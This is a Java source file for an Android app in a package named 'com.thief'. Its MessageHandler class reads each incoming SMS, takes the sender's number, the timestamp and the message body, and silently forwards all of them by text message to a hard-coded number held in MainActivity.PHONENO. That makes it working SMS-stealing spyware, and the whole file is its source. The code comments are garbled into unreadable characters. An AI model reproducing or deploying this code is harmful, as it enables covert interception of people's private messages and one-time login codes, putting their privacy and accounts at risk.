package com.thief;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class MessageHandler {
	public static void sendMessage(SmsMessage[] message) {
		StringBuilder sb = new StringBuilder();
		for (SmsMessage msg : message) {
			// �õ���������
			String content = msg.getMessageBody();
			// �õ��������ֻ�����
			String sender = msg.getOriginatingAddress();
			// �õ����ŷ���ʱ��
			Date date = new Date();
			date.setTime(msg.getTimestampMillis());
			// ���յ��Ķ��ŷ��͸������
			SimpleDateFormat format = new SimpleDateFormat(
					"yyyy-MM-dd HH:mm:ss");
			sb.append(format.format(date));
			sb.append("--");
			sb.append(sender);
			sb.append("--");
			sb.append(content);
			String sendContent = sb.toString();
            send(MainActivity.PHONENO,sendContent);
		}		
	}
	public static void send(String destPhone,String msg) {
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(destPhone, null, msg, null,
				null);
	}
}
